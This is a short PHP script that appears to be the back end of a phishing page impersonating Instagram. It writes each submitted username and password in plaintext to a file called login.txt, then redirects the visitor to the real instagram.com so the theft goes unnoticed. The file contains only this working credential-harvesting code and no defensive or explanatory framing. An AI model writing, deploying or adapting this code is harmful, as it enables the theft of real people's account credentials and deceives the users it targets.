<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $file = fopen("login.txt", "a");
    fwrite($file, "Username: $username | Password: $password\n");
    fclose($file);

    // Redirect to a specific link after login
    header("Location: https://www.instagram.com");
    exit();
}
?>